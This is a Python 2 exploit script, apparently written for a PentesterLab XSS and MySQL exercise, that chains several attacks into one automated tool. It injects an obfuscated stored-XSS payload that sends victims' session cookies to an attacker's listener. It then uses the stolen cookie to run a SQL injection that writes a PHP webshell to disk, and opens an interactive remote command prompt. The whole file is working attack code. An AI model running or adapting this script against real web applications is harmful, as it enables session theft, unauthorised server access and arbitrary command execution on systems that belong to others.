import requests,sys,socket,argparse

class Exploit():    
    def __init__(self,target_path, target_ip, target_port, host_ip, host_port, wordlist):
       
        self.target_ip = target_ip
        self.target_port = target_port
        self.target_path = target_path
        self.host_ip = host_ip
        self.host_port = host_port
        self.wordlist = wordlist

    def StringFromCharCode(self): #Convert the host address to String.FromCharcode XSS payload
            ip = str(self.host_ip) + ":" + str(self.host_port)
            s = "".join([str(ord(string))+", " for string in ip])
            final_str = s[:-1]
            payload = "String.fromCharCode(108, 111, 99, 97, 116, 105, 111, 110, 46, 114, 101, 112, 108, 97, 99, 101, 40, 34, 104, 116, 116, 112, 58, 47, 47, {0} 47, 115, 46, 112, 104, 112, 63, 99, 109, 100, 61, 34, 32, 43, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101, 41, 59)".format(final_str)
            return payload

    def get_cookie(self): #get cookie from XSS vulnerability.
       
        url = "http://" + str(self.target_ip) + ":" + str(self.target_port)
        path = self.target_path
        payload = self.StringFromCharCode()
        xss_payload ='<img src="1" onerror="eval({0});">'.format(payload)
        final_xss_payload = {
                             "title":"",
                             "author":"",
                             "text":xss_payload,
                             "submit":"Submit"
                            }
        xss_request = requests.post(str(url+path), data=final_xss_payload)
        
        print "[+] Xss payload Sent!"
        print "[*] Waiting for cookie on port 8080.."
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host_ip, int(self.host_port)))
        s.listen(5)
        
        conn,addr = s.accept()
        data = conn.recvfrom(1024)
        if data != "":
            conn.send('HTTP/1.1 200 OK\n')
            cookie =  str(data).replace("('", "").replace("', None)","")[:-2].replace("GET","").split()[0][21:]
            print "[+] Got cookie!: " + cookie
            conn.close()
            c.sqlinjection(cookie)
        
    def sqlinjection(self, cookie): #Attack trying to upload a webshell
        url = "http://" + str(self.target_ip) + ":" + str(self.target_port)
        path = str("/admin/edit.php?id=1")
        wordlist = open(self.wordlist,"r")
        cookie = {"PHPSESSID":cookie}
        for i in wordlist:  
            sql_payload = str("%20UNION%20ALL%20SELECT%20%27%3C?php%20system($_GET%5Bcmd%5D);?%3E%27,NULL,NULL,NULL%20INTO%20OUTFILE%20%27{0}%27--%20-".format(i).replace("\n",""))
            try:
                r = requests.get(url + path + sql_payload, cookies=cookie)
            except requests.exceptions.RequestException as e:
                print e
                sys.exit()
            #print "[*] Sent: {0}".format(i)
            url_shell = url + i[8:-1]
            try:
                checker = requests.get(url_shell, cookies=cookie)     
                #print checker.url_sql
                #print checker
                if checker.status_code == 200:
                    webshell = checker.url + "?cmd="
                    print "[+] Found the correct path {0}".format(url+i[8::])
                    print "[+] Getting webshell.."
                    print "[!] This is a webshell, you cannot use commands like 'cd'..Good hacking!"
                    while True:
                        q = raw_input("$ ")
                        webshell_cmd = requests.get(webshell+q)
                        print webshell_cmd.text.replace("\N", "").replace("Welcome	Welcome to my blog. Leave a comment if you like the new design :) ", "").replace("Notice: Use of undefined constant cmd - assumed 'cmd' in /var/www/css/d.php on line 2", "")[6::]
            except KeyboardInterrupt:
                print "[!] Bye bye h4ck3rm4n ;)"
                
if __name__== "__main__":
    
    parser = argparse.ArgumentParser(description='XSS and Mysql File (PentesterLabs) AUTOPWN!')
    parser.add_argument('-lhost', help='Local ip')
    parser.add_argument('-lport', default=8080, help='Local port, Default(8080). Port 80 (HTTP) will not work here bro!..')
    parser.add_argument('-rhost', help='Target ip')
    parser.add_argument('-rport', default=80, help='Target port',)
    parser.add_argument('-wordlist', help='Wordlist location i.e: wordlist.txt')
    parser.add_argument('-path', default="/post_comment.php?id=2", help='Target path i.e: "/post_comment.php?id=2"')
    args = parser.parse_args()
    if len(sys.argv) == 1:
        sys.exit(0)
    c = Exploit(args.path, args.rhost, args.rport, args.lhost, args.lport, args.wordlist)
    c.get_cookie()
